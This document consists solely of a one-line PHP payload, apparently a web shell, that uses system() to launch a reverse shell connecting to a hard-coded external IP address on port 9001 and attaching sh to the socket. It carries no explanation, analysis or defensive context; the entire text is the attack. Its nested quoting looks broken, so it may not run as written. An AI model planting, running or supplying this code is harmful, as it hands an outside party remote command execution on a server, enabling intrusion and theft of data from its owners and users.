<?php system("php -r '$sock=fsockopen("104.234.196.102",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"); ?>
